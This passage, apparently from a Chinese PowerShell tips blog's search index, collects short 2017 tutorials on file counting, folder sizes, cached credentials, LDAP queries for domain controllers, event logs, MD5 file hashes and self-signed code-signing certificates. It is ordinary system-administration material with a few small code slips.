属性能够获取对象数量之前，所有文件将会堆在内存里。当进行递归搜索时，这种情况更严重。 一个节约非常多资源的方法是类似这样使用 Measure-Object： 1(Get-ChildItem -Path c:\\windows | Measure-Object).Count 这里使用流来获取项目的数量，所以 PowerShell 不需要在内存中存储所有文件。","link":"/2017/09/22/counting-files-efficiently-part-1/"},{"title":"PowerShell 技能连载 - 高效统计文件数量（第二部分）","text":"在前一个技能中我们学习了如何有效地统计一个文件夹中项目的数量。以下是更多的例子。 用 PowerShell 统计指定文件夹中文件的数量易如反掌： 12345$count = Get-ChildItem -Path &quot;$home\\Desktop&quot; -Force | Measure-Object | Select-Object -ExpandProperty Count&quot;Number of files: $Count&quot; 只需要调整 Get-ChildItem 的参数就可以找到更多。例如添加 -Recurse 开关，就可以包括子文件夹中的文件： 12345$count = Get-ChildItem -Path &quot;$home\\Desktop&quot; -Force -Recurse -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count&quot;Number of files: $Count&quot; 或者，只关注某些文件。这个例子只统计两层目录深度以内的 log 和 txt 文件： 12345$count = Get-ChildItem -Path $env:windir -Force -Recurse -Include *.log, *.txt -ErrorAction SilentlyContinue -Depth 2 | Measure-Object | Select-Object -ExpandProperty Count&quot;Number of files: $Count&quot; （请注意：-Depth 参数是 PowerShell 5 引入的）","link":"/2017/09/25/counting-files-efficiently-part-2/"},{"title":"PowerShell 技能连载 - 计算文件夹大小","text":"Measure-Object 也可以计算属性值的总和。它可以用来计算文件夹大小。以下代码计算用户配置文件（可能需要一些时间，视找到的文件数量而定）。它只是将所有文件的“Length”属性相加： 1234$size = (Get-ChildItem -Path $home -Force -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum&quot;Folder Size: $sum Bytes&quot;'Folder Size: {0:n2} MB' -f ($size/1MB) 输出的结果类似如下： Folder Size: 172945767402 Bytes Folder Size: 164.933,94 MB 您可为 Get-ChildItem 添加更多的参数，显式地控制哪些文件参加统计。例如这段代码添加了 -Filter 参数，并指定文件的扩展名，来只统计用户配置文件目录中找到的 PowerShell 脚本文件的大小。 1234$size = (Get-ChildItem -Path $home -Filter *.ps1 -Force -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum&quot;Folder Size: $size Bytes&quot;'Folder Size: {0:n2} MB' -f ($size/1MB)","link":"/2017/09/26/calculating-folder-file-size/"},{"title":"PowerShell 技能连载 - 操作 PowerShell Gallery 内容","text":"公共的 PowerShell Gallery (www.powershellgallery.com) 是一个 PowerShell 脚本作者们可以自由地交换脚本和模块的地方。您所需要的只是包含 PowerShellGet 的 PowerShell 5，它带了操作 Gallery 需要的 cmdlet。 当然，您需要自己确认代码，确保它可以完美运行，并且没有安全问题。 有一个模块叫做“PSCredentialManager”。以下是如何查看这个模块信息的方法： 123456789101112PS&gt; Find-Module -Name PSCredentialManager | Select-Object -Property *Name : pscredentialmanagerVersion : 1.0.1Type : ModuleDescription : This module allows management and automation of Windows cached credentials.Author : Adam BertramCompanyName : adamtheautomatorCopyright : (c) 2017 Adam Bertram. All rights reserved.PublishedDate : 18.06.2017 22:14:27... 要安装这个模块，请运行以下代码： 1PS&gt; Install-Module -Name PSCredentialManager -Scope CurrentUser -RequiredVersion 0.6 请注意我们显式地要求安装 0.6 版。在写这篇文章的时候，还有个 1.0.1 版，但存在一些问题。当您从一个公开的地方，例如 PowerShell Gallery 中获取内容，随时有可能得到非预期的结果，请留意。 如果您希望在安装一个模块前检查它的代码，可以使用 Save-Module，将模块下载到一个隔离的地方。 1234567PS&gt; Find-Module pscredentialmanager -AllVersionsVersion Name Repository Description------- ---- ---------- -----------1.0.1 pscredentialmanager PSGallery This module allows0.6 pscredentialmanager PSGallery This module allows0.2 pscredentialmanager PSGallery This module allows 安装完成后，以下命令可以返回一个新 cmdlet 的列表： 1234567PS&gt; Get-Command -Module pscredentialmanagerCommandType Name Version Source----------- ---- ------- ------Function Get-CachedCredential 0.6 pscredentialmanagerFunction New-CachedCredential 0.6 pscredentialmanagerFunction Remove-CachedCredential 0.6 pscredentialmanager 您现在可以管理缓存的凭据。例如要返回一个缓存的凭据列表，请试试以下代码： 1234567PS&gt; Get-CachedCredentialName : SSO_POP_UserCategory : MicrosoftAccountType : Domain Extended Credentials(...) 如果您想看看新的 cmdlet（也叫函数）如何工作，您还可以阅读它的源码。这行代码将函数的源码复制到剪贴板： 1PS&gt; ${function:Get-CachedCredential} | clip 要弃用这个模块，只需要卸载它： 1PS&gt; Uninstall-Module -Name pscredentialmanager -AllVersions","link":"/2017/09/27/playing-with-powershell-gallery-content/"},{"title":"PowerShell 技能连载 - 获取缓存的凭据","text":"在前一个技能中我们谈到一个名为“PSCredentialManager”的公共模块，可以用来管理缓存的凭据。有些时候，少即是多。当您阅读它的代码时，会发现它是通过一个名为 cmdkey.exe 的控制台命令在和 windows 系统打交道。 要获取您本机缓存的凭据，您只需要这样： 1234567891011121314PS&gt; cmdkey /listCurrently stored credentials: Target: MicrosoftAccount:target=SSO_POP_User Type: Domain Extended Credentials User: XXXXX.com Saved for this logon only Target: MicrosoftAccount:target=SSO_POP_Device Type: Domain Extended Credentials User: 06jbdrfztrwsvsb Saved for this logon only... 它输出的是纯文本。然而，PowerShell 可以用 ForEach-Object 处理原始数据： 123456789101112131415161718192021222324252627282930cmdkey.exe /list | ForEach-Object {$found=$false} { $line = $_.Trim() if ($line -eq '') { if ($found) { $newobject } $found = $false $newobject = '' | Select-Object -Property Type, User, Info, Target } else { if ($line.StartsWith(&quot;Target: &quot;)) { $found = $true $newobject.Target = $line.Substring(8) } elseif ($line.StartsWith(&quot;Type: &quot;)) { $newobject.Type = $line.Substring(6) } elseif ($line.StartsWith(&quot;User: &quot;)) { $newobject.User = $line.Substring(6) } else { $newobject.Info = $line } }} 结果类似这样： Type User Info Target ---- ---- ---- ------ Domain Extended Credentials tabcabcabc@hicsawr.com Saved for this logon only Mi Domain Extended Credentials 02jbqxcbqvsb Saved for this logon only Mi Generic tabcabcabc@hicsawr.com Local machine persistence Le Generic Local machine persistence Le Generic Local machine persistence Le Generic Local machine persistence Le Generic tabcabcabc@hicsawr.com Local machine persistence Le Generic Local machine persistence Le Generic 02jdrxcbqvsb Local machine persistence Wi Generic Martin Le Domain Password Martin Do Domain Password Martin Do Domain Password User Do","link":"/2017/09/28/getting-cached-credentials/"},{"title":"PowerShell 技能连载 - 查找 Windows 的产品密钥","text":"当您需要从备份中还原电脑状态时，首先要知道您的 Windows 产品密钥。以下是一个简单的单行命令，可以获得产品密钥信息： 1(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey","link":"/2017/09/29/finding-your-windows-product-key/"},{"title":"PowerShell 技能连载 - 准备磁盘驱动器","text":"以前，我们用 chkdsk.exe 来修复磁盘。现在这个功能仍然能用。 从 Windows Server 2012 R2 和 Windows 8.1 开始，加入了一个新的 cmdlet，名字叫 Repair-Volume。类似 chkdsk.exe 它需要以管理员身份运行。 您可以用它来扫描驱动器的错误： 1234PS&gt; Repair-Volume -Scan -DriveLetter cNoErrorsFoundPS&gt; 您也可以使用 cmdlet 来修复错误： -OfflineScanAndFix 选项：将卷置于脱机，扫描并且修复所有遇到的错误（相当于 chkdsk /f）。 -SpotFix 选项：暂时将卷置于脱机，并只修复记录在 $corrupt 文件中的错误（相当于 chkdsk /spotfix）。","link":"/2017/10/02/repairing-disk-drives/"},{"title":"PowerShell 技能连载 - PowerShell 2 接近过期","text":"Microsoft 刚刚宣布 PowerShell 2 很快将会标记为“已过期的”。它在一段时间内仍然可以用，但是友情提醒您最好不要使用它，并请关注 PowerShell 5。 PowerShell 2 是 Windows 7 缺省带的 PowerShell。但即使在现代的操作系统中，PowerShell 2 仍然存在。让我们看看 PowerShell 2 对你的系统有多大影响。 以下这行代码返回当前 PowerShell 的版本号： 12PS&gt; $PSVersionTable.PSVersion.Major5 如果显示的版本号低于 5，那么您需要检查升级的策略。PowerShell 5 是 PowerShell 最新的版本，并且 Windows 7 和 Server 2008 R2 以上的版本都可以通过更新获得它。通常没有任何理由运行 PowerShell 5 以下的版本，除非在那些运行着过时的可能依赖于更早版本的 PowerShell 的软件组件的服务器上。 这行代码将告诉您 PowerShell 2 子系统是否仍然存在： 12345PS&gt; powershell -version 2.0Windows PowerShellCopyright (C) 2009 Microsoft Corporation. All rights reserved.PS&gt; 如果这行代码运行后没有报任何错，并且启动了一个版权为“2009”的 PowerShell，那么说明 Windows 功能 PowerShell 2 还是启用状态。这不太好。这个功能原本是作为需要 PowerShell 2 的脚本的降级环境。现在该子系统基本不再使用，而变成一个恶意脚本代码的攻击维度，因为PowerShell 2 比起 PowerShell 5 缺少一些安全和保护功能。例如，相比于 PowerShell 5，运行在在 PowerShell 2 子系统中的恶意代码不会在反病毒引擎中有效地记录和报告。 除非有很强的理由保留 PowerShell 2，正常情况下您应该移除它。在客户端操作系统中，请打开控制面板，程序和功能，“启用或关闭 Windows 功能”，然后反选“Windows PowerShell 2.0”。 对于服务器系统，请使用 Remove-WindowsFeature。","link":"/2017/10/03/powershell-2-now-considered-deprecated/"},{"title":"PowerShell 技能连载 - Launching Daily Tools via Alias","text":"您可能知道一些 PowerShell 预定义的缩写名称：例如 dir 和 ls 等别名能够节约您每天的打字时间。有许多好的原因值得扩展这些别名的列表并且增加您日常使用的工具。 例如，原先需要点击使用 SnippingTool 截屏工具，不如为它增加一个别名： 123PS&gt; Set-Alias -Name snip -Value snippingtool.exePS&gt; snip 下一次您需要截取窗体的一部分到 bug 报告中时，只需要在 PowerShell 中运行 snip 即可。 另一个可能有用的工具是 osk.exe，您的 Windows 10 屏幕键盘，或者 mstsc.exe 来创建一个远程桌面连接。 要将您的别名持久化，只需要将它们增加到 PowerShell 配置文件脚本中。它的路径可以在这里找到： 12PS&gt; $profile.CurrentUserAllHostsC:\\Users\\username\\Documents\\WindowsPowerShell\\profile.ps1 这个文件默认不存在。如果您创建了它，脚本中的任何内容都会在您启动一个 PowerShell 宿主的时候执行。您只需要启用脚本执行一次即可： 1PS&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force","link":"/2017/10/04/launching-daily-tools-via-alias/"},{"title":"PowerShell 技能连载 - 移除 Windows 10 APP","text":"PowerShell 可能是最简单的移除预装 Windows 10 APP 的方法。如果您知道想要移除的应用程序名称，只需要以管理员身份打开 PowerShell，然后像这样移除 APP： 1234PS&gt; Get-AppxPackage *bingweather* | Remove-AppxPackage -WhatIfWhat if: Performing the operation &quot;Remove package&quot; on target &quot;Microsoft.BingWeather_4.20.1102.0_x64__8wekyb3d8bbwe&quot;.PS&gt; 注意：请去掉 -WhatIf 参数来实际移除 APP，不要删除作用不明的应用程序。可能其它 APP 会依赖这个 Appx 包。","link":"/2017/10/05/removing-windows-10-applications/"},{"title":"PowerShell 技能连载 - 将网络连接模式从私有网络切到公有网络（反之亦然）","text":"Starting with Windows Server 2012 R2 and Windows 8.1, PowerShell ships with many useful cmdlets for client and server configuration. This comes handy as some settings can no longer be controlled via UI.从 Windows Server 2012 R2 和 Windows 8.1 开始，随着 PowerShell 发布了许多有用的客户端和服务器配置 cmdlet。这些 cmdlet 十分趁手，因为一些设置可以不再通过 UI 来控制。 例如，要改变网络的类型，只需要以管理员身份运行以下代码： 123456789101112131415PS&gt; Get-NetConnectionProfileName : internet-cafeInterfaceAlias : WiFiInterfaceIndex : 13NetworkCategory : PrivateIPv4Connectivity : InternetIPv6Connectivity : InternetPS&gt; Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Public -WhatIfWhat if:","link":"/2017/10/06/changing-network-connection-mode-from-private-to-public-and-vice-versa/"},{"title":"PowerShell 技能连载 - 来自 Microsoft 的免费电子书","text":"微软正在提供关于不同主题，无限量的免费电子书。电子书可以通过 PowerShell 来下载。https://blogs.msdn.microsoft.com/mssmallbiz/2017/07/11/largest-free-microsoft-ebook-giveaway-im-giving-away-millions-of-free-microsoft-ebooks-again-including-windows-10-office-365-office-2016-power-bi-azure-windows-8-1-office-2013-sharepo/ 以下是下载这些电子书的 PowerShell 代码： http://ligman.me/2ux8pSo 当您运行这个脚本之前，请确保创建了 c:\\book 目录。这是电子书的下载目录。不过，这个脚本还不够智能，如果该目录不存在的话需要手动创建这个目录。","link":"/2017/10/09/free-ebooks-from-microsoft/"},{"title":"PowerShell 技能连载 - 查找所有域控制器","text":"如果您安装了免费的 Microsoft RSAT tools，那么您就拥有了 ActiveDirectory 模块。以下是一个查找组织中所有域控制器的简单方法： 1234#requires -Module ActiveDirectory$filter = '(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'Get-ADComputer -LDAPFilter $filter 基本上，您可以运行任意的 LDAP 过滤器查询。只需要选择合适的 cmdlet，例如 Get-ADComputer、Get-ADUser 或最通用的 Get-ADObject。","link":"/2017/10/10/find-all-domain-controllers/"},{"title":"PowerShell 技能连载 - 查找所有域控制器（不依赖于模块）","text":"在前一个技能中我们解释了如何使用 ActiveDirectory 模块和它的 cmdlet 来查找组织中的所有域控制器，或执行任何其它 LDAP 查询。 以下使用纯 .NET 方法实现相同目的。它不需要任何其它 PowerShell 模块，而且不需要事先安装 RSAT 工具。它需要您的电脑是 Active Directory 中的一个成员。 1234$ldapFilter = &quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))&quot;$searcher = [ADSISearcher]$ldapFilter$searcher.FindAll() 这行代码返回搜索结果对象。如果您确实想查看真实的 AD 对象，请试一试： 1$searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }","link":"/2017/10/11/finding-all-domain-controllers-no-module-required/"},{"title":"PowerShell 技能连载 - 转换奇怪的数据格式","text":"有些时候，您会被奇怪的数据格式难住，例如在 log 文件中，它无法自动转换为 DateTime 对象。以下是一个快速的解析此类日期时间信息的方法： 123$weirdDate = '03 12 --- 1988'[DateTime]::ParseExact($weirdDate, 'MM dd --- yyyy', $null) 如您所见，ParseExact() 用标准的 .NET 日期和时间字符，如您所愿处理自定义日期和时间格式。以下是大小写敏感的： yy,yyyy: Year M, MM, MMM, MMMM: Month d,dd,ddd,dddd: Day H, HH: Hour (24hr clock) h,hh: Hour (12hr clock) m,mm: Minute s,ss: Second","link":"/2017/10/12/converting-weird-data-formats/"},{"title":"PowerShell 技能连载 - 评价事件日志信息","text":"Get-EventLog 可以访问传统的 Windows 事件日志写入的内容。可以在一个名为 ReplacementStrings 的属性中找到最有价值的信息。以下是一个使该信息可视化并且可以利用它来生成报告的方法。 在这个例子中，将获取 Windows Update 客户端写入的 ID 为 44 的事件，并且这段代码输出替换的字符串。它们将精确地告知我们何时下载了哪些更新： 12345678910111213141516Get-EventLog -LogName System -InstanceId 44 -Source Microsoft-Windows-WindowsUpdateClient |ForEach-Object { $hash = [Ordered]@{} $counter = 0 foreach($value in $_.ReplacementStrings) { $counter++ $hash.$counter = $value } $hash.EventID = $_.EventID $hash.Time = $_.TimeWritten [PSCustomObject]$hash } 始终确保查询一个唯一的事件 ID：对于每个事件 ID，ReplacementStrings 中的信息是唯一的，您一定不希望将不同的事件 ID 类型中的信息混在一起。","link":"/2017/10/13/evaluating-event-log-information/"},{"title":"PowerShell 技能连载 - 用管道将信息输出到 Excel","text":"以下是一个短小但是十分有用的函数，能够从其它 cmdlet 接收数据并发送到 Excel： 1234567891011function Out-Excel{ param( $path = &quot;$env:temp\\report$(Get-Date -Format yyyyMMddHHmmss).csv&quot; ) $Input | Export-Csv $path -NoTypeInformation -UseCulture -Encoding UTF8 Invoke-Item $path} 只需要将任何数据通过管道输出至 Out-Excel。例如： 1PS C:\\&gt; Get-Process | Out-Excel","link":"/2017/10/16/pipe-information-to-excel/"},{"title":"PowerShell 技能连载 - 确定启动时间点和启动以来的时间","text":"WMI 可以告诉您系统是什么时候启动的，还可以利用这个信息计算启动以来经历的时间： 12345$bootTime = Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty LastBootupTime$upTime = New-TimeSpan -Start $bootTime$min = [int]$upTime.TotalMinutes&quot;Your system is up for $min minutes now.&quot; 请注意当使用 -ComputerName 访问远程系统时，Get-CimInstance 默认使用 WinRM 远程处理。旧的系统可能没有启用 WinRM 远程处理，而仍然使用 DCOM 技术。","link":"/2017/10/17/determine-boot-time-and-uptime/"},{"title":"PowerShell 技能连载 - 远程确定启动时间点和启动以来的时间","text":"Get-CimInstance 是一个用来获取 WMI 信息的有用的 cmdlet，因为它使用标准的 .NET DateTime 对象，而不是奇怪的 WMI datetime 格式。然而，Get-CimInstance 使用 WinRM 来进行远程访问，而传统的 Get-WmiObject 使用 DCOM 来进行远程访问。 非常古老的系统可能还没有配置为使用 WinRM 远程处理，并且可能仍然需要 DCOM。以下是演示如何使用 Get-CimInstance 和 DOM 来查询非常古老的机器的示例代码： 123456789101112131415# change computer name to a valid remote system that you# can access remotely$computername = 'server12'# use DCOM for older systems that do not run with WinRM remoting$option = New-CimSessionOption -Protocol Dcom$session = New-CimSession -ComputerName $computername -SessionOption $option$bootTime = Get-CimInstance -ClassName Win32_OperatingSystem -CimSession $session | Select-Object -ExpandProperty LastBootupTime$upTime = New-TimeSpan -Start $bootTime$min = [int]$upTime.TotalMinutes&quot;Your system is up for $min minutes now.&quot;Remove-CimSession -CimSession $session","link":"/2017/10/18/determine-boot-time-and-uptime-remotely/"},{"title":"PowerShell 技能连载 - 揭开错误处理的秘密","text":"PowerShell 代码中所有的错误信息都包含在错误记录对象中。请看以下的函数，它可以从这样的错误记录中解析所有相关的错误信息： 12345678910111213141516171819202122232425function Get-ErrorInfo{ param ( [Parameter(ValueFrompipeline)] [Management.Automation.ErrorRecord]$errorRecord ) process { $info = [PSCustomObject]@{ Exception = $errorRecord.Exception.Message Reason = $errorRecord.CategoryInfo.Reason Target = $errorRecord.CategoryInfo.TargetName Script = $errorRecord.InvocationInfo.ScriptName Line = $errorRecord.InvocationInfo.ScriptLineNumber Column = $errorRecord.InvocationInfo.OffsetInLine Date = Get-Date User = $env:username } $info }} 这个函数使得错误处理代码更短更容易理解。如果您需要立即处理一个错误，请使用 try/catch 概念，并且确保使用 -ErrorAction 通知 cmdlet 当发生错误时立即停止： 12345678try{ Stop-Service -Name someservice -ErrorAction Stop}catch{ $_ | Get-ErrorInfo} 如果您希望代码完成，并且在过后检查发生了哪些错误，请使用 -ErrorAction SilentlyContinue 以及 -ErrorVariable。同时，Get-ErrorInfo 函数有很大帮助： 12$result = Get-ChildItem -Path C:\\Windows -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable myErrors$myErrors | Get-ErrorInfo","link":"/2017/10/19/demystifying-error-handling/"},{"title":"PowerShell 技能连载 - 补零","text":"您是否曾需要将数字转换为以零开头的字符串，例如生成服务器名？只需要使用 PowerShell 的 -f 操作符： 12$id = 12'server{0:d4}' -f $id 以下是输出结果： 1server0012 -f 操作符左边是文本模板，右边是数值。在文本模板中，用 {x} 作为右侧数值的占位符。占位符的下标从 0 开始。 要在左侧补零，使用 d（digit 的缩写）加上您需要的数字位数即可。","link":"/2017/10/20/creating-leading-zeros/"},{"title":"PowerShell 技能连载 - Creating Balloon Tips Safely","text":"受到 MVP 同行 Boe Prox 一篇文章的启发，编写了一个精致的创建气球状提示对话框的函数。您可以在 Boe 的原始文章中找到背景信息：https://mcpmag.com/articles/2017/09/07/creating-a-balloon-tip-notification-using-powershell.aspx。 您可以找到许多关于如何显示气球状提示的使用技巧，但大多数都只是一个不能操作的任务栏图标。 以下函数是基于 Boe 的点子，但可以确保不需要全局变量或任何其它会污染 PowerShell 环境的东西。当您调用 Show-BalloonTip 时，一个气球状提示将从桌面的右下角滑入。您可以点击打开这个工具提示并再次关闭它，或者取消它。当您取消它时，它的图标会留在任务栏的托盘区域。当您点击托盘图标，该气球状图标会再次显示。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function Show-BalloonTip{ param ( [Parameter(Mandatory=$true)][string]$Text, [string]$Title = &quot;Message from PowerShell&quot;, [ValidateSet('Info','Warning','Error','None')][string]$Icon = 'Info' ) Add-Type -AssemblyName System.Windows.Forms # we use private variables only. No need for global scope $balloon = New-Object System.Windows.Forms.NotifyIcon $cleanup = { # this gets executed when the user clicks the balloon tip dialog # take the balloon from the event arguments, and dispose it $event.Sender.Dispose() # take the event handler names also from the event arguments, # and clean up Unregister-Event -SourceIdentifier $event.SourceIdentifier Remove-Job -Name $event.SourceIdentifier $name2 = &quot;M&quot; + $event.SourceIdentifier Unregister-Event -SourceIdentifier $name2 Remove-Job -Name $name2 } $showBalloon = { # this gets executed when the user clicks the tray icon $event.Sender.ShowBalloonTip(5000) } # use unique names for event handlers so you can open multiple balloon tips $name = [Guid]::NewGuid().Guid # subscribe to the balloon events $null = Register-ObjectEvent -InputObject $balloon -EventName BalloonTipClicked -Source $name -Action $cleanup $null = Register-ObjectEvent -InputObject $balloon -EventName MouseClick -Source &quot;M$name&quot; -Action $showBalloon # use the current application icon as tray icon $path = (Get-Process -id $pid).Path $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path) # configure the balloon tip $balloon.BalloonTipIcon = $Icon $balloon.BalloonTipText = $Text $balloon.BalloonTipTitle = $Title # make the tray icon visible $balloon.Visible = $true # show the balloon tip $balloon.ShowBalloonTip(5000)}","link":"/2017/10/23/creating-balloon-tips-safely/"},{"title":"PowerShell 技能连载 - 创建 MD5 文件哈希","text":"MD5 文件哈希可以唯一确定文件内容，并且可以用来检测文件内容是否唯一。在 PowerShell 5 中，有一个新的 cmdlet 可以创建文件哈希。以下代码将在您的用户配置文件中查找所有 PowerShell 脚本，并且为每个文件生成 MD5 哈希： 123Get-ChildItem -Path $home -Filter *.ps1 -Recurse | Get-FileHash -Algorithm MD5 | Select-Object -ExpandProperty Hash 一个更好的方法是将哈希值关联到原始路径上： 1234567Get-ChildItem -Path $home -Filter *.ps1 -Recurse | ForEach-Object { [PSCustomObject]@{ Hash = ($_ | Get-FileHash -Algorithm MD5).Hash Path = $_.FullName } } 输出结果类似如下： 1234567891011Hash Path---- ----2AE5CA30DCF6550903B994E61A714AC0 C:\\Users\\tobwe\\.nuget\\packages\\Costura.Fody...46CB505EECEC72AA8D9104A6263D2A76 C:\\Users\\tobwe\\.nuget\\packages\\Costura.Fody...2AE5CA30DCF6550903B994E61A714AC0 C:\\Users\\tobwe\\.nuget\\packages\\Costura.Fody...46CB505EECEC72AA8D9104A6263D2A76 C:\\Users\\tobwe\\.nuget\\packages\\Costura.Fody...930621EE040F82392017D240CAE13A97 C:\\Users\\tobwe\\.nuget\\packages\\Fody\\2.1.2\\T...39466FE42CE01CC7786D8B446C4C11C2 C:\\Users\\tobwe\\.nuget\\packages\\MahApps.Metr...2FF7910807634C984FC704E52ABCDD36 C:\\Users\\tobwe\\.nuget\\packages\\microsoft.co...C7E3AAD4816FD98443A7F1C94155954D C:\\Users\\tobwe\\.nuget\\packages\\microsoft.co......","link":"/2017/10/24/creating-md5-file-hashes/"},{"title":"PowerShell 技能连载 - 查找重复的文件","text":"在前一个技能中我们介绍了如何用 Get-FileHash cmdlet（PowerShell 5 新增的功能）来生成脚本文件的 MD5 哈希。 哈希可以用来查找重复的文件。大体上，哈希表可以用来检查一个文件哈希是否已经发现过。以下代码检查您的用户配置文件中的所有脚本并且报告重复的文件： 123456789101112131415161718$dict = @{}Get-ChildItem -Path $home -Filter *.ps1 -Recurse | ForEach-Object { $hash = ($_ | Get-FileHash -Algorithm MD5).Hash if ($dict.ContainsKey($hash)) { [PSCustomObject]@{ Original = $dict[$hash] Duplicate = $_.FullName } } else { $dict[$hash]=$_.FullName } } | Out-GridView","link":"/2017/10/25/finding-file-duplicates/"},{"title":"PowerShell 技能连载 - 从文本生成 MD5 哈希","text":"Get-FileHash cmdlet 可以从文件内容生成哈希值。它无法从任意文本生成哈希值。并且只适用于 PowerShell 5 及更高的版本。 以下是一个小的函数，用 .NET Framework 从任意文本生成 MD5 哈希值： 123456789101112131415161718Function Get-StringHash{ param ( [String] $String, $HashName = &quot;MD5&quot; ) $bytes = [System.Text.Encoding]::UTF8.GetBytes($String) $algorithm = [System.Security.Cryptography.HashAlgorithm]::Create('MD5') $StringBuilder = New-Object System.Text.StringBuilder $algorithm.ComputeHash($bytes) | ForEach-Object { $null = $StringBuilder.Append($_.ToString(&quot;x2&quot;)) } $StringBuilder.ToString()} 每段文本都会生成一个唯一（且短小）的哈希值，所以它可以快速地判断文本是否唯一。它也可以用来检查一大段文本是否有变更过。 1234PS C:\\&gt; Get-StringHash &quot;Hello World!&quot;ed076287532e86365e841e92bfc50d8cPS C:\\&gt;","link":"/2017/10/26/generating-md5-hashes-from-text/"},{"title":"PowerShell 技能连载 - 对比从 PowerShell 远程处理中受到的计算机数据","text":"PowerShell 远程处理是一个查询多台计算机的快速方法，因为 PowerShell 远程处理是并行工作的。以下是一个演示一系列有趣技术的真实案例。 目标是从两台计算机中获取正在运行的进程的列表，然后查找区别。 为了速度最快，进程列表是通过 PowerShell 远程处理和 Invoke-Command，并且结果是从两台计算机获得的。 要区分输入的数据，我们使用了 Group-Object。它通过计算机名对数据集分组。结果是一个哈希表，而计算机名是哈希表的键。 下一步，用 Compare-Object 来快速比较两个列表并查找区别： 12345678910111213# get data in parallel via PowerShell remoting# make sure you adjust the computer names$computer1 = 'server1'$computer2 = 'server2'$data = Invoke-Command { Get-Process } -ComputerName $computer1, $computer2# separate the data per computer$infos = $data | Group-Object -Property PSComputerName -AsHashTable -AsString# find differences in running processesCompare-Object -ReferenceObject $infos.$computer1 -DifferenceObject $infos.$computer2 -Property ProcessName -PassThru | Sort-Object -Property ProcessName | Select-Object -Property ProcessName, Id, PSComputerName, SideIndicator","link":"/2017/10/27/comparing-computer-data-received-from-powershell-remoting/"},{"title":"PowerShell 技能连载 - 在 Active Directory 中使用 LDAP 过滤器","text":"LDAP 过滤器类似 Active Directory 中使用的查询语言。并且如果您安装了 Microsoft 的 RSAT 工具，您可以很方便地用 ActiveDirectory 模块中的 cmdlet 来用 LDAP 过滤器搜索用户、计算机，或其它资源。 以下代码将查找所有无邮箱地址的用户： 12$filter = '(&amp;(objectCategory=person)(objectClass=user)(!mail=*))'Get-ADUser -LDAPFilter $filter -Prop * 即便您没有 RSAT 工具和指定的 ActiveDirectory cmdlet 的权限，LDAP 过滤器也十分有用： 123456$filter = '(&amp;(objectCategory=person)(objectClass=user)(!mail=*))'$searcher = [ADSISearcher]$filter# search results only$searcher.FindAll()# access to directory entry objects with more details$searcher.FindAll().GetDirectoryEntry() | Select-Object -Property *","link":"/2017/10/30/using-ldap-filters-in-active-directory/"},{"title":"PowerShell 技能连载 - 创建自签名的代码签名证书","text":"如果您想对您的脚本进行数字签名，首先您需要一个包含“代码签名”功能的数字证书。如果只是测试，您可以方便地创建免费的个人自签名证书。不要期望其他人信任这些证书，因为任何人都可以创建它们。这是一种很好的测试驱动代码签名的方法。 从 PowerShell 4 开始，New-SelfSignedCertificate cmdlet 可以创建签名证书。以下代码创建一个包含私钥和公钥的 PFX 文件： 123456789101112#requires -Version 5# this is where the cert file will be saved$Path = &quot;$env:temp\\codeSignCert.pfx&quot;# you'll need this password to load the PFX file later$Password = Read-Host -Prompt 'Enter new password to protect certificate' -AsSecureString# create cert, export to file, then delete again$cert = New-SelfSignedCertificate -KeyUsage DigitalSignature -KeySpec Signature -FriendlyName 'IT Sec Department' -Subject CN=SecurityDepartment -KeyExportPolicy ExportableEncrypted -CertStoreLocation Cert:\\CurrentUser\\My -NotAfter (Get-Date).AddYears(5) -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.3')$cert | Export-PfxCertificate -Password $Password -FilePath $Path$cert | Remove-Item 在接下来的技能里，我们将看一看可以用新创建的证书来做什么。","link":"/2017/10/31/creating-self-signed-code-signing-certificates/"},{"title":"PowerShell 技能连载 - 从 PFX 文件加载证书","text":"在前一个技能中我们演示了如何使用 New-SelfSignedCertificate 来创建新的代码签名证书，并且将它们存储为一个 PFX 文件。今天让我们来看看如何加载一个 PFX 文件。 假设您的 PFX 文件存放在 $env:temp\\codeSignCert.pfx。以下是读取该文件的代码： 1$cert = Get-PfxCertificate -FilePath &quot;$env:temp\\codeSignCert.pfx&quot; 这段代码执行时，将会提示输入密码。这个密码是您创建证书时输入的密码，并且它保护这个文件不被滥用。 当命令成功执行以后，可以从 $cert 变量获取证书详细信息： 1234567891011121314151617181920212223242526272829303132333435PS C:\\&gt; $certThumbprint Subject---------- -------5D8A325641CC583F882B439833961AE9BCDEC946 CN=SecurityDepartmentPS C:\\&gt; $cert | Select-Object -Property *EnhancedKeyUsageList : {Code Signing (1.3.6.1.5.5.7.3.3)}DnsNameList : {SecurityDepartment}SendAsTrustedIssuer : FalseEnrollmentPolicyEndPoint : Microsoft.CertificateServices.Commands.EnrollmentEndPointPropertyEnrollmentServerEndPoint : Microsoft.CertificateServices.Commands.EnrollmentEndPointPropertyPolicyId :Archived : FalseExtensions : {System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid}FriendlyName : IT Sec DepartmentIssuerName : System.Security.Cryptography.X509Certificates.X500DistinguishedNameNotAfter : 9/29/2022 12:57:28 AMNotBefore : 9/29/2017 12:47:28 AMHasPrivateKey : TruePrivateKey : System.Security.Cryptography.RSACryptoServiceProviderPublicKey : System.Security.Cryptography.X509Certificates.PublicKeyRawData : {48, 130, 3, 10...}SerialNumber : 45C8C7871DC392A44AD1ADD28FFDFAC7SubjectName : System.Security.Cryptography.X509Certificates.X500DistinguishedNameSignatureAlgorithm : System.Security.Cryptography.OidThumbprint : 5D8A325641CC583F882B439833961AE9BCDEC946Version : 3Handle : 2832940980736Issuer : CN=SecurityDepartmentSubject : 